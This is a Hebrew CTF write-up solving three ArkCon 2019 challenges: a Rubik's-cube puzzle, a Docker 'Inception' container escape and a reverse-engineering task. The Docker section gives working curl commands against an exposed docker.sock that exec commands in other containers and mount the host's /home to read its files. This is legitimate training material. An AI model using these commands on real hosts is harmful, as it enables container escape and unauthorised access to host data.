@@ -1,0 +1,665 @@
+######################################################################################
+# This is a textual version of the writeup, in order to make the text searchable.    #
+# For a readable version which includes images, please refer to the PDF.             #
+######################################################################################
+
+סדרת אתגרי ArkCon 2019 (OnSite)
+מאת YaakovCohen88 ו- Dvd848
+
+הקדמה
+בהמשך לסדרת האתגרים של CyberArk לקראת כנס ArkCon 2019, הכנס עצמו כלל שלושה אתגרים נוספים אשר היו פתוחים למספר שעות. במאמר-המשך זה נביא את הפתרון שלנו לשלושת אתגרי הכנס. למי שלא קרא ומעוניין - בגליון הקודם פרסמנו מאמר עם הפתרונות לאתגרים שקדמו לכנס.
+
+אתגר #1: IAmCu*e (100,000 נקודות)
+ 
+אם נתחבר לשרת, נראה את הפלט הבא:
+ 
+השרת מבקש קלט בבסיס 12. נכניס קלט לדוגמא ונקבל:
+ 
+בחינה מדוקדקת של השינוי תראה שהשורה הרביעית "זזה" כולה שמאלה בצורה מעגלית (כך שהשלישייה השמאלית ביותר מצאה את עצמה בתור השלישייה הימנית ביותר, ושאר השלישיות ביצעו קפיצה שמאלה).
+קלטים שונים ערבבו את הפלט בצורה אחרת. לדוגמא, הקלט "1" הזיז את השורה הרביעית ימינה בצורה מעגלית, ופעולות אחרות הזיזו שלישיות באופן שונה. 
+במבט ראשון, קצת קשה לראות מה בדיוק הטקסט מייצג. ייתכן שהרמז הבא יעזור:
+ 
+יש לנו שש פאות, כל אחת מחולקת לתשעה חלקים. יש לנו שישה צבעים, וכל אחד מהם חוזר תשע פעמים. מדובר ב... קובייה הונגרית!
+במקרה שלנו, נראה שכל חלק מיוצג על ידי שני תווים: התו הראשון הוא האות הראשונה של הצבע, והתו השני כנראה ישמש אותנו בעתיד, כשהקובייה תסודר.
+תריסר הפעולות שניתן לבצע מתאימות לתריסר הפעולות שמוגדרות עבור קובייה הונגרית:
+ 
+מהרגע שהתובנה הזו מושגת, הצעד הבא צריך להיות ברור לחלוטין: עלינו לפתור את הקובייה.
+אומרים שניתן לפתור כל קובייה באמצעות לא יותר מ-20 מהלכים. ישנם אנשים מוכשרים שיודעים לפתור קוביות הונגריות בצורה אוטומטית לחלוטין, ואולי חלקם אף יצליחו לפתור קובייה שמיוצגת בדו-מימד. כל השאר יכולים להשתמש בספריות מוכנות לפתרון קוביות הונגריות, כמו זו. אך לפני כן, עלינו לייצג את הקובייה שניתנה לנו בצורה נוחה, על מנת שנוכל להמיר אותה לייצוג שהספרייה מצפה לה.
+אנחנו נייצג את הקובייה באמצעות מערכים מקוננים - כל פאה תיוצג על ידי מערך, שבו שלושה מערכים המייצגים שורות. ששת הפאות יישמרו במערך גדול שייצג את הקובייה שלנו.
+כלומר, הקובייה שראינו קודם תיוצג באופן הבא:
+[ [['gE', 'bI', 'yI'], ['rO', 'wO', 'gE'], ['gF', 'wT', 'bE']], 
+  [['oH', 'gN', 'rL'], ['yO', 'oN', 'oT'], ['rG', 'rA', 'y&']], 
+  [['w!', 'rA', 'rB'], ['wG', 'gE', 'wT'], ['oR', 'bY', 'bR']], 
+  [['yH', 'yK', 'rF'], ['g-', 'rW', 'bE'], ['oO', 'bE', 'wY']], 
+  [['gL', 'wO', 'wI'], ['rG', 'bT', 'oU'], ['o-', 'oI', 'b-']], 
+  [['gS', 'o:', 'yO'], ['yT', 'yR', 'yS'], ['wU', 'gC', 'bS']] ]
+לשם הנוחות, נתחיל להתייחס לפאות השונות באמצעות השמות הבאים:
+ 
+במערך שלנו, הפאות מקבלות את האינדקסים הבאים:
+UP      = 0
+LEFT    = 1
+FRONT   = 2
+RIGHT   = 3
+BACK    = 4
+DOWN    = 5
+
+
+
+
+
+
+
+הדרך שלנו לעבור מהייצוג הטקסטואלי של התרגיל לייצוג הקובייה באמצעות מערכים מקוננים היא על ידי שימוש בפונקציה הבא:
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+def get_cube(lines):
+    cube_arr = []
+    rows = []
+    for line in lines.split("\n"):
+        line = line.rstrip()
+        if line != "":
+            rows.append(line.split())
+    assert(len(rows) == 9)
+    
+    cube_arr.append([rows[i] for i in range(3)])
+
+    for i in range(4):
+        cube_arr.append([rows[3 + j][i * 3: i * 3 + 3] for j in range(3)])
+    
+    cube_arr.append([rows[i + 6] for i in range(3)])
+כעת, לאחר שייצרנו ייצוג שנוח לנו לעבוד איתו, עלינו להמיר אותו לייצוג שהספרייה מצפה לקבל כקלט. הספרייה דרשה מחרוזת ארוכה של תווים בסדר מסוים: קודם תשעת הצבעים של הפאה U, לאחר מכן אלה של R, ואז F, D, L, B. לשם כך, היה נוח לסדר את הקובייה מחדש:
+
+cube_arr_new = [cube_arr[UP], cube_arr[RIGHT], cube_arr[FRONT], cube_arr[DOWN], cube_arr[LEFT], cube_arr[BACK]]
+ואז "לשטח" אותה למחרוזת ארוכה, ולהחזיר כל אות שנייה (האותיות של הצבע, ללא התווים הנלווים):
+
+"".join(list(itertools.chain.from_iterable(itertools.chain.from_iterable(cube_arr_new))))[::2]
+ולבסוף, להמיר את הצבעים לתווים שהספרייה דרשה:
+
+cube = cube.replace("w", "U").replace("r", "R").replace("g", "F").replace("y", "D").replace("o", "L").replace("b", "B")
+הסבר: הצבע של פאה נקבע על ידי הצבע של החלק האמצעי של הפאה, שאף פעם אינו משתנה (חלק זה לא יכול לזוז). בדוגמא שלנו, הצבעים הם:
+ 
+הייצוג של הספרייה לא מוכן לקבל שמות מפורשים של צבעים, אלא מבקש שנתייחס לצבעים בהקשר של פאות. לדוגמא, מכיוון שלפאה העליונה ישנו צבע לבן (החלק האמצעי שלה הוא לבן), הספרייה מבקשת שבכל פעם שנרצה לייצג צבע לבן, נעשה זאת באמצעות הקידוד U (על שם פאת UP).
+הקובייה המקורית שראינו בדוגמא תקבל את הייצוג הבא:
+DFBBUUFRFURRFRBLBULFRUFULBBFLDDDDUFBFUUDLLRRDDDRRBLLLB
+
+והספרייה תחשב עבורה את הפתרון הבא:
+F' B' R L' D' L2 U2 R L2 B L' U' L2 U2 L2 U B2 D L2 D' R2
+
+כאשר הספרה 2 מוצמדת לצעד כלשהו אם יש לבצע אותו פעמיים.
+נפתור את הקובייה לפי הצעדים ונקבל:
+ 
+כעת אפשר לראות בבירור מהו התו השני. אם נתייחס אך ורק אליו, נקבל את המסר הבא שמכיל את הדגל:
+YOUGOTIT!-THE-FLAG-IS:NICENOWGETYOURSELFABEER&KIORTOSH
+
+הקוד המלא:
+import kociemba
+import itertools
+from pwn import *
+import time
+
+MENU_STRING = "Please enter an input in Base-12: "
+
+UP      = 0
+LEFT    = 1
+FRONT   = 2
+RIGHT   = 3
+BACK    = 4
+DOWN    = 5
+
+def center_color_at(cube_arr, face):
+    return cube_arr[face][1][1][0]
+
+def get_cube(lines):
+    cube_arr = []
+    rows = []
+    for line in lines.split("\n"):
+        line = line.rstrip()
+        if line != "":
+            rows.append(line.split())
+    assert(len(rows) == 9)
+    
+    cube_arr.append([rows[i] for i in range(3)])
+
+    for i in range(4):
+        cube_arr.append([rows[3 + j][i * 3: i * 3 + 3] for j in range(3)])
+    
+    cube_arr.append([rows[i + 6] for i in range(3)])
+
+    assert(center_color_at(cube_arr, UP)    == 'w')
+    assert(center_color_at(cube_arr, LEFT)  == 'o')
+    assert(center_color_at(cube_arr, FRONT) == 'g')
+    assert(center_color_at(cube_arr, RIGHT) == 'r')
+    assert(center_color_at(cube_arr, BACK)  == 'b')
+    assert(center_color_at(cube_arr, DOWN)  == 'y')
+
+    cube_arr_new = [cube_arr[UP], cube_arr[RIGHT], cube_arr[FRONT], cube_arr[DOWN], cube_arr[LEFT], cube_arr[BACK]]
+
+    return "".join(list(itertools.chain.from_iterable(itertools.chain.from_iterable(cube_arr_new))))[::2]
+
+r = remote("18.197.75.101", "1337")
+data = r.recvuntil(MENU_STRING, drop = True)
+
+print data
+cube = get_cube(data)
+cube = cube.replace("w", "U").replace("r", "R").replace("g", "F").replace("y", "D").replace("o", "L").replace("b", "B")
+
+moves = ["U", "U'", "D", "D'", "F", "F'", "B", "B'", "R", "R'", "L", "L'"]
+sol = kociemba.solve(cube)
+
+print "Steps to solve:\n{}".format(sol)
+
+formatted_sol = []
+
+for command in sol.split():
+    num_commands = 1 if "2" not in command else 2
+    clean_command = command.rstrip("2")
+    for i in range(num_commands):
+        formatted_sol.append(str(format(moves.index(clean_command), 'x')))
+
+print "\nFormatted steps:\n{}".format(", ".join(formatted_sol))
+r.sendline("".join(formatted_sol))
+
+output = r.recvuntil("You got it...", drop = True)
+cubes = output.split(MENU_STRING)
+print cubes[-1]
+print "".join(cubes[-1].split("\n")).replace(" ", "")[1::2]
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+דוגמא לריצה:
+  
+אתגר #2: Inception (30,000 נקודות)
+ 
+פתרון:
+האתגר הזה הוא המשך לאתגר ה-Container שראינו בסבב הקודם.
+ 
+גם באתגר הזה, נראה שנצטרך למצוא דרך לברוח מה-container שלנו החוצה, אל המחשב המארח. אלא שהפעם, האתגר בנוי ברוח הסרט Inception, עם container-ים על משקל חלומות. הסיפור מוסבר בקובץ טקסט שנמצא בתיקיית המשתמש שלנו, cobb (שהוא גיבור הסרט):
+ 
+ומה לגבי שאר הקבצים?
+ 
+זה היה קל. נמשיך לחלום השני. מיותר לציין שהשיטות שעבדו באתגר הקודם לא הצליחו הפעם. מה כן עבד? חזרה למקורות, כלומר חיפוש שיטות סטנדרטיות לבריחה מ-container-ים של Docker.
+אחד הדברים שעלו פעם אחר פעם בחיפוש היה /var/run/docker.sock (הוא אף הוזכר במאמר מגליון 97 על פתרון אתגרי BSidesTLV 2018). זהו ה-Socket שה-daemon של Docker מאזין עליו, ובאמצעותו אפשר לתקשר עם ה-daemon מתוך ה-container. זה אולי נוח מבחינה פונקציונלית במקרים מסוימים, אך פותח פרצת אבטחה מאוד רצינית אם הוא חשוף ל-container שלא ניתן לסמוך עליו, שהרי הוא מעניק שליטה מלאה על מערכת ה-Docker.
+אחד הדברים הבסיסיים ביותר שאפשר לעשות עם ממשק הניהול הוא לצפות ב-container-ים השונים, באמצעות הפקודה
+
+curl --unix-socket /var/run/docker.sock http/containers/json?all=1
+התוצאה:
+ 
+אם נסנן החוצה קצת רעש, נישאר עם:
+[{"Id":"c33004f0bc60ea9384b76a1d005816041872b10a566eda5a20990cf6149cec27", "Image":"mydockerid7/dream2"},
+{"Id":"1dc62a9336538ef6b92732c5b6108dc8a0d14241b11f2d0556b56e212d42fc9f", "Image":"mydockerid7/dream1.1_light"}]
+כלומר, אנחנו יכולים לראות פה שני container-ים, אחד של החלום הראשון ואחד של השני. וכעת, כשיש לנו את המזהה שלהם, אנחנו יכולים להריץ עליהם פקודות!
+כדי להריץ פקודה, נשתמש בצעדים הבאים:
+קודם כל, נשלח את התבנית הבאה שכוללת את הפקודה שברצוננו להריץ (יש להכניס את המזהה במקום המתאים (זוהי פקודת exec-create):
+curl -X POST --unix-socket /var/run/docker.sock http/v1.24/containers/<container_id>/exec -H "Content-Type:application/json" -d '{"AttachStdin": true, "AttachStdout": true, "AttachStderr": true, "Cmd": ["ls", "/home/"], "DetachKeys": "ctrl-p,ctrl-q", "Privileged": true,"Tty": true, "User": "cobb"}'
+בתור תשובה נקבל מזהה בקשה:
+ 
+ניקח את המזהה הזה ונקרא באמצעותו את הפלט על ידי שימוש בתבנית הבאה (פקודת exec-start שבעצם מריצה את הפקודה):
+curl -X POST --unix-socket /var/run/docker.sock http/v1.24/exec/<command_id>/start -H "Content-Type:application/json" -d '{"Detach": false, "Tty": false}' --output -
+
+למשל:
+ 
+בדוגמא הזו השתמשנו במזהה של ה-container שלנו, ולכן קיבלנו חזרה את תוכן תיקיית home שכבר הכרנו. ננסה לבצע את הפעולה הזו גם עבור ה-container השני, ועל הדרך ניצור נוסח מקוצר שמאגד את שתי הפקודות לפקודה אחת באמצעות שימוש בתבנית הבאה:
+curl -X POST --unix-socket /var/run/docker.sock http/v1.24/exec/$(curl -s -X POST --unix-socket /var/run/docker.sock http/v1.24/containers/<container_id>/exec -H "Content-Type:application/json" -d '{"AttachStdin": true, "AttachStdout": true, "AttachStderr": true, "Cmd": ["ls", "/home"], "DetachKeys": "ctrl-p,ctrl-q", "Privileged": true,"Tty": true, "User": "cobb"}' | awk -F'"' '{ printf $4 }')/start -H "Content-Type:application/json" -d '{"Detach": false, "Tty": false}' --output -
+
+ 
+הסבר: הפקודה הראשונה נקראת כתת-פקודה בתוך הפקודה השנייה. היא עדיין מייצרת את הבקשה ומחזירה מחרוזת json כמו קודם, אך באמצעות שימוש ב-awk אנו שולפים את ה-command_id ישירות ו"מאכילים" באמצעותה את הפקודה שמשמשת לצפייה בפלט:
+ 
+זהו החלק השני של המפתח!
+ננסה לקרוא אותו:
+ 
+שימו לב שבפקודה הקודמת, שהציגה את התוכן של התיקייה, הפלט חזר עם תו ראשון שלא היה חלק מהפלט המקורי (תו סגירת סוגריים). במקרה הקודם היה קל להתעלם ממנו, אך איך נדע אם הדבר קרה שוב כשהדפסנו את המפתח?
+נשמש ב-base64 על מנת לוודא:
+ 
+גם פה הפלט מתחיל עם תו לא קשור (נקודה, שאינה תו base64 חוקי). לכן המפתח מתחיל מהתו i. נותר לנו חלק אחד אחרון. לפי ההודעה בתחילת האתגר, הוא נמצא "במציאות", כלומר במחשב המארח. נצטרך למצוא דרך לפרוץ החוצה מה-container שלנו. למזלנו, באמצעות שליטה בממשק ה-Docker, אנחנו יכולים לייצר container חדש עם גישה לקבצים מבחוץ!
+התיעוד של “docker create” קובע כי על מנת לייצר container, יש צורך לכל הפחות ב-image.
+ 
+נתחיל מסקירה של ה-images השונים באמצעות פקודת list-image:
+ 
+יש לנו שני images - הראשון mydockerid7/dream2 והשני mydockerid7/dream1.1_light (ולמען האמת, ראינו אותם גם קודם כשסקרנו את ה-container-ים השונים). נבחר בשני, בלי סיבה מיוחדת.
+בנוסף, נרצה לספק קונפיגורציה שתגדיר לבצע mount לתיקיית /home של המחשב המארח. בסך הכל, נשתמש בפקודה הבאה (פקודת create container):
+
+curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "mydockerid7/dream1.1_light", "Cmd": ["sh"], "Mounts": [{"Target":"/home","Source":"/home", "Type":"bind", "ReadOnly": false}]}' -X POST http:/v1.24/containers/create
+נריץ את הפקודה ונקבל container ID נוסף:
+ 
+אך אם ננסה להריץ פקודה על ה-container החדש, נקבל את השגיאה הבאה:
+ 
+אפשר להריץ את פקודת ContainerStart על מנת להרים את ה-container אבל בואו פשוט נריץ dump במקום, באמצעות הפקודה archive, שבעצם מייצרת ארכיון tar: 
+curl --unix-socket /var/run/docker.sock http/v1.24/containers/<container_id>/archive?path=/home --output -
+
+והתוצאה:
+ 
+אפשר לראות את הנתיב /home/key.part3 ומיד אחריו את תוכן החלק השלישי של המפתח.
+השלמנו את המפתח:
+6$xH*AOd1eBu&LKS0|T#Q=4jEqkl{7[iP:!<^@mYMh3fGs>~D/tp"X,gb%C+(zw`c_y5;9N}oFar.UW)VI8J]2vnZ?R
+
+בתיאור התרגיל נרמז כי המפתח מקודד באמצעות base91, אולם במקרה שלנו, מפתח הקידוד אינו המפתח הסטנדרטי אלא זה שהוצאנו מה-container-ים השונים. לכן, על מנת לפענח את הדגל, נשתמש בסקריפט פשוט לפענוח base91 אשר החלפנו לו את המפתח.
+הקוד:
+# Base91 encode/decode for Python 2 and Python 3
+#
+# Copyright (c) 2012 Adrien Beraud
+# Copyright (c) 2015 Guillaume Jacquenot
+# All rights reserved.
+#
+# Redistribution and use in source and binary forms, with or without
+# modification, are permitted provided that the following conditions are met:
+#
+#   * Redistributions of source code must retain the above copyright notice,
+#     this list of conditions and the following disclaimer.
+#   * Redistributions in binary form must reproduce the above copyright notice,
+#     this list of conditions and the following disclaimer in the documentation
+#     and/or other materials provided with the distribution.
+#   * Neither the name of Adrien Beraud, Wisdom Vibes Pte. Ltd., nor the names
+#     of its contributors may be used to endorse or promote products derived
+#     from this software without specific prior written permission.
+#
+# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
+# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
+# DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE
+# FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
+# DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
+# SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
+# CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
+# OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
+# OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+#
+import struct
+
+def decode(encoded_str, key):
+    ''' Decode Base91 string to a bytearray '''
+    decode_table = dict((v, k) for k, v in enumerate(key))
+    v = -1
+    b = 0
+    n = 0
+    out = bytearray()
+    for strletter in encoded_str:
+        if not strletter in decode_table:
+            continue
+        c = decode_table[strletter]
+        if (v < 0):
+            v = c
+        else:
+            v += c * 91
+            b |= v << n
+            n += 13 if (v & 8191) > 88 else 14
+            while True:
+                out += struct.pack('B', b & 255)
+                b >>= 8
+                n -= 8
+                if not n > 7:
+                    break
+            v = -1
+    if v + 1:
+        out += struct.pack('B', (b | v << n) & 255)
+    return out
+
+def main():
+    flag = 'Ppn.4W{cP=aah(H[k_!XA!g2zbVfa90M^D7.2mh2C||otC;u!$'
+
+    key1 = '6$xH*AOd1eBu&LKS0|T#Q=4jEqkl{7['
+    key2 = 'iP:!<^@mYMh3fGs>~D/tp"X,gb%C+(z'
+    key3 = 'w`c_y5;9N}oFar.UW)VI8J]2vnZ?R'
+
+    key = key1 + key2 + key3
+    print decode(flag, key)
+
+if __name__ == '__main__':
+    main()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+הפלט:
+ 
+הדגל:
+ArkCon{y0u_mU57_n07_B3_4Fr41d_70_dR34m!}
+ 
+אתגר #3: Billiejean (400,000 נקודות)
+ 
+פתרון:
+נתחיל מהרצה של הבינארי:
+C:\Users\yaakovco\Desktop\CTF\ArkCon\RE>billiejean.exe
+Nope...
+
+
+נבחן את קובץ ההרצה ב-IDA:
+ 
+ 
+נראה שהתוכנה מצפה לקלט מהמשתמש, וניתן לראות שאורך הקלט צריך להיות 32 תווים: לאחר מכן ישנה לולאה שרצה 4 פעמים (כמובן ש-i מתחיל מ-0), כאשר בכל פעם טוענים את ה-resource ה-(i+0x78) ומחליפים את ההרשאות של האזור בזיכרון ל-0x40 (.(RWX
+ 
+לאחר מכן מבצעים פעולת xor על כל בית ב-resource שקראנו, כאשר התו שאיתו מבצעים את ה-xor מגיע מהקלט של המשתמש. עבור ה-resource הראשון מבצעים פעולות xor עם התו הראשון של הקלט, עבור ה-resource השני משתמשים בתו השני של הקלט, וכך הלאה.
+ 
+תחילה מבצעים פעולות xor על ה- resource בכל פעם על 32 בתים בעזרת פקודות XMM:
+ 
+ולאחר מכן, כאשר נשארו פחות מ-32 בתים, מבצעים xor בית אחרי בית:
+ 
+המשימה הראשונה היא להבין מהם ארבעת התווים הראשונים של הקלט, אשר משמשים לביצוע ה-xor. מכיוון שהרשאות הזיכרון אליו נטענו ארבעת ה-resource-ים שונו ל-RWX, נוכל להניח שמדובר בקבצי הרצה של חלונות. קבצי הרצה של חלונות מתחילים תמיד עם התווים MZ (ניתן למצוא מידע נוסף על הפורמט הזה, שנקרא פורמט PE, במאמר מגליון 90). נוכל לחלץ את ארבעת הקבצים ולמצוא את ארבעת התווים הראשונים של הסיסמא על ידי פעולתxor  של התו הראשון בכל resource עם התו M:
+for i in xrange(4):
+    with open(str(0x7b+i), 'rb') as f:
+        char = f.read(1)
+        print chr(ord(char) ^ ord('M')),
+קיבלנו את התווים h0ll, ואלו ארבעת התווים הראשונים של הקלט שלנו. בסוף כל איטרציה ישנה קריאה לפונקציה sub_401000, אשר מקבלת כפרמטר את ה-resource המתאים ובנוסף את מספר האיטרציה (i).
+ 
+נבדוק היכן ישנה התייחסות לקלט שהכנסנו בתוך הפונקציה:
+ 
+נראה שהפונקציה קוראת את ה-DWORD ב-offset 0x3c ומשתמשת בו כ-offset מתחילת ה-resource. ה-offset הזה נמצא בתוך ה-MZ header והוא בעצם מצביע ל-offset שבו נמצא המבנה הבא - ה-NT Header:
+ 
+אל ה-offset הזה היא מוסיפה ערך כתלות בערך i, ואז מבצעת xor של הבית במקום שהגענו אליו עם הבית ה-i של ארבעת התווים הבאים בקלט. לכן המשימה הבאה היא להבין מה ארבעת הבתים הבאים של הקלט צריכים להיות.
+עבור i = 0 היא מוסיפה את הערך 0x80, מה שמביא אותנו ל-Offset 0x178:
+ 
+עבור i = 1 היא מוסיפה את הערך 0x14, מה שמביא אותנו ל-Offset 0x10C: 
+ 
+עבור i = 2 היא מוסיפה את הערך 0x06, מה שמביא אותנו ל-Offset 0xFE:
+ 
+ועבור i = 3 היא מוסיפה את הערך 0, מה שמשאיר אותנו ב-Offset 0xF8 שהוא גם הבית הראשון של מבנה ה-NT Header. לפי הגדרת הפורמט, מבנה זה חייב להתחיל עם הקבוע “PE”, ולכן זהו הערך שהכי קל למצוא: עלינו פשוט לבצע xor של הערך הנוכחי עם הערך של האות P וכך נקבל את התו הרביעי ברביעייה שאנו מחפשים כעת:
+ 
+נותרו לנו שלושה resource-ים ושלושה תווים למצוא. נוכל לבדוק מה אמור להיות כל ערך באמצעות חקירה של מאפייני כל קובץ, אבל מכיוון שגודל ה-resources זהה הנחנו כי מדובר בקבצים פחות או יותר זהים.
+ 
+ואכן בדיקה קצרה מראה שהקבצים זהים מאוד למעט מספר בתים בודדים:
+ 
+לכן, ה-headers אמורים להיות זהים במקומות ששונו, כלומר, נוכל להשוות בין ה-headers ולמצוא את ארבעת התווים הבאים של הקלט. אחרי שתיקנו את ה-resource הרביעי (Resource 126), נוכל להעתיק את שאר הערכים ממנו.
+לשם כך כתבנו את הקוד הבא:
+import struct
+key = ''
+
+# find key
+
+for i in xrange(4):
+    with open(str(0x7b+i), 'rb') as f:
+        char = f.read(1)
+        key += chr(ord(char) ^ ord('M'))
+
+data = [0]*4
+# decrypt files
+for i in xrange(4):
+    with open(str(0x7b+i), 'rb') as f1:
+        chars = f1.read()
+        data[i] = ''.join([chr(ord(key[i]) ^ ord(c)) for c in chars])
+
+
+nt_start = struct.unpack('<I', data[3][0x3c:0x40])[0]
+
+tmp_key = chr(ord(data[3][nt_start]) ^ ord('P'))
+data[3] = data[3][:nt_start] + 'P' + data[3][nt_start+1:]
+
+tmp_key = chr(ord(data[3][nt_start + 0x06]) ^ ord(data[2][nt_start + 0x06])) + tmp_key
+data[2] = data[2][:nt_start + 0x06] + data[3][nt_start + 0x06] + data[2][nt_start + 0x06 + 1:]
+
+
+tmp_key = chr(ord(data[3][nt_start + 0x14]) ^ ord(data[1][nt_start + 0x14])) + tmp_key
+data[1] = data[1][:nt_start + 0x14] + data[3][nt_start + 0x14] + data[1][nt_start + 0x14 + 1:]
+
+tmp_key = chr(ord(data[3][nt_start + 0x80]) ^ ord(data[0][nt_start + 0x80])) + tmp_key
+data[0] = data[0][:nt_start + 0x80] + data[3][nt_start + 0x80] + data[0][nt_start + 0x80 + 1:]
+
+print tmp_key
+ התוצאה היא 0w1n, ובצירוף מה שקיבלנו קודם, שמונת התווים הראשונים של הקלט הנדרש הם h0ll0w1n.
+בהמשך נוכל לראות שמכל resource נוצר thread ונשלחת לו כפרמטר תת מחרוזת באורך 6 ממחרוזת הקלט:
+input[8+6*i:8+6*(i+1)] 
+
+ 
+ 
+לאחר מכן הפונקציה הראשית בודקת אם קיימים ה-atoms "V_I" , "V_II", "V_III", "V_IV":
+ 
+במידה וכל הארבעה קיימים נקבל תשובה חיובית:
+ 
+נחזור ל-DLL-ים ונמצא שהתנאי ליצירת ה-atom בכל DLL תלוי בלולאה על אורך הקלט, כאשר בכל איטרציה ישנה קריאה לפונקציה sub_401000 (החלפנו לה את השם ל-check_char). נראה שפונקציה זו מקבלת כפרמטר את המיקום של התו ואת התו עצמו:
+ 
+מכיוון שהלוגיקה עצמה זהה בכל קבצי ה-DLL שפענחנו, ורק הערכים שונים, נביא כדוגמא רק את ה-DLL הראשון.
+לפי הקוד הבא:
+ 
+התו הראשון צריך לקיים:
+input[0]+44 != 0
+
+(אם נשים לב התנאי הזה תמיד מתקיים בגלל צורת העתקת הערך לתוך האוגר בזמן ההעברה כפרמטר).
+ 
+התו השני צריך לקיים:
+input[1]^0x14^0x40^0x31 == 0x3A
+
+ 
+התו השלישי צריך לקיים:
+
+input[2]+0x23 == 0x9c
+ 
+התו הרביעי צריך לקיים:
+(input[3]^0x54)*0x31 == 0x1324
+ 
+התו החמישי צריך לקיים:
+input[4]+0x85 == 0xFA
+
+ 
+התו השישי צריך לקיים:
+(input[5]^0x14^0x40)*0x31 == 0xB1A
+לאחר הלולאה ישנה בדיקה שאורך הקלט שווה ל-6, ואחרת הפונקציה נכשלת. כפי שראינו קודם, תנאי זה מתקיים כי אורך הקלט עבור כל DLL הוא אכן 6.
+ 
+כל מה שנשאר הוא לקבל את ה-flag, נשתמש לשם כך בקוד הבא:
+
+key = 'h0ll0w1n'
+
+# 123
+
+# input[0]+44 != 0
+key += '?'
+# input[1]^0x14^0x40^0x31 == 0x3A
+key += chr(0x14 ^ 0x40 ^ 0x31 ^ 0x3A)
+# input[2]+0x23 == 0x9c
+key += chr(0x9c - 0x23)
+# (input[3]^0x54)*0x31 == 0x1324
+key += chr((0x1324 / 0x31) ^ 0x54)
+# input[4]+0x85 == 0xFA
+key += chr(0xFA - 0x85)
+# (input[5]^0x14^0x40)*0x31 == 0xB1A
+key += chr((0xB1A / 0x31) ^ 0x14 ^ 0x40)
+
+# 124
+
+# input[0]+53 != 0
+key += '?'
+# input[1]^0x5B == 4
+key += chr(0x04 ^ 0x5B)
+# input[2]+0x5B == 0xCB
+key += chr(0xCB - 0x5B)
+# (input[3]^0x61)*0x06 == 0x72
+key += chr((0x72 / 0x06) ^ 0x61)
+# input[4]+0x67 == 0x97
+key += chr(0x97 - 0x67)
+# (input[5]^0x16^0x4B)*0x06 == 0x174
+key += chr((0x174 / 0x06) ^ 0x16 ^ 0x4B)
+
+# 125
+
+# input[0]+0x1F != 0
+key += '?'
+# input[1]^0x05^0x24^0x26 == 0x32
+key += chr(0x05 ^ 0x24 ^ 0x26 ^ 0x32)
+# input[2]+0x03 == 0x38
+key += chr(0x38 - 0x03)
+# (input[3]^0x29)*0x26 == 0x3DC
+key += chr((0x3DC / 0x26) ^ 0x29)
+# input[4]+0x4F == 0x84
+key += chr(0x84 - 0x4F)
+# (input[5]^0x05^0x24)*0x26 == 0x12B4
+key += chr((0x12B4 / 0x26) ^ 0x05 ^ 0x24)
+
+#126
+
+# input[0]+0x02 != 0
+key += '?'
+# input[1]^0x09^0x0B^0x47 == 0x76
+key += chr(0x09 ^ 0x0B ^ 0x47 ^ 0x76)
+# input[2]-0x33 == 0x01
+key += chr(0x01 + 0x33)
+# (input[3]^0x14)*0x47 == 0x1C4A
+key += chr((0x1C4A / 0x47) ^ 0x14)
+# input[4]+0x5B == 0x92
+key += chr(0x92 - 0x5B)
+# (input[5]^0x09^0x0B)*0x47 == 0xF41
+key += chr((0xF41 / 0x47) ^ 0x09 ^ 0x0B)
+
+print key
+
+וקיבלנו h0ll0w1n?_y0un?_pr0c?5535_?34r75 (התווים שהם סימני שאלה יכולים להיות כל תו). נריץ ונקבל:
+C:\Users\VM\Desktop\CTF\ArkCon\billiejean>billiejean.exe h0ll0w1n?_y0un?_pr0c?5535_?34r75
+You are the one!
+Good job.
+
+
+
+אחרי קצת (הרבה) ניסיונות למצוא את ה-flag שאליו היוצרים כיוונו, קיבלנו:
+h0ll0w1n6_y0un6_pr0c35535_h34r75
+
+סיכום
+ 
+כל הכבוד ל-CyberArk על ארגון ה-CTF, ובכלל על ארגון הכנס המושקע שלהם, זו השנה השנייה ברציפות. 
+במאמר הקודם הלנו על כך שהאתגרים נסגרו מיד עם סגירת המועד הרשמי. שמחנו לראות שהאתגרים נפתחו מחדש, כולל אלו שהיו בכנס עצמו, בעקבות הבקשה שלנו ושל אחרים. הדבר אפשר, בין השאר, את כתיבת המאמר הזה.
+לסיום, תודה רבה לכל מי שעזר, ייעץ ותרם לפתרון האתגרים בכנס עצמו!
+
